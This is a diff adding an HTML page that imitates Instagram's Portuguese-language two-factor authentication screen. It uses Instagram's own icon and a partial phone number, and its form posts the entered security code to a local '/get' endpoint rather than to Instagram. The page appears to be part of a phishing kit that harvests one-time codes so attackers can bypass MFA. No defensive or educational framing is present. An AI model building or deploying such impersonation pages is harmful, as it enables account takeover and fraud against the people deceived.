@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="./assets/css/main.css">
+  <title>Instagram</title>
+</head>
+<body>
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="./assets/img/homepage.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+          <i data-visualcompletion="css-img" aria-label="Ícone de cadeado da autenticação de dois fatores" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/ya/r/dAoPDEPVlH5.png&quot;); background-position: 0px -104px; background-size: auto; width: 76px; height: 76px; background-repeat: no-repeat; display: inline-block;"></i>
+          <!-- principal form init. -->
+          <form action="/get" method="post" class="c-panel__form">
+            <p style="text-align: center; margin: 30px 0 15px 0">Digite o código que enviamos para o seu número com final 5659</p>
+            <input type="number" name="mfa" class="c-panel__input" placeholder="Código de segurança" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
+            maxlength = "6" required>
+            <button type="submit" class="c-btn">Confirmar</button>
+          </form>
+          <!-- principal form final. -->
+          <div class="confiar" style="display: flex; width: 300px; align-items: center; margin: 30px 0 30px 0">
+            <input type="checkbox" name="" id="" style="width: 14px; height: 14px;">
+            <div class="baixo" style="font-size: 12px; margin-left: 10px">
+              <p style="margin-bottom: 5px; font-weight: bold;">Confiar neste dispositivo</p>
+              <p>Não solicitaremos um código na próxima vez</p>
+            </div>
+          </div>
+          <div class="reenviar" style="font-size: 14px; display: flex; flex-direction: column; align-items: center">
+            <p>Não recebeu o código de segurança? Podemos </p>
+            <a href="/" style="color: #0095f6;">reenviá-lo</a>
+          </div>
+        </div>
+        <div class="c-app">
+          <p>Obtenha o aplicativo.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+  </main>
+</body>
+</html>
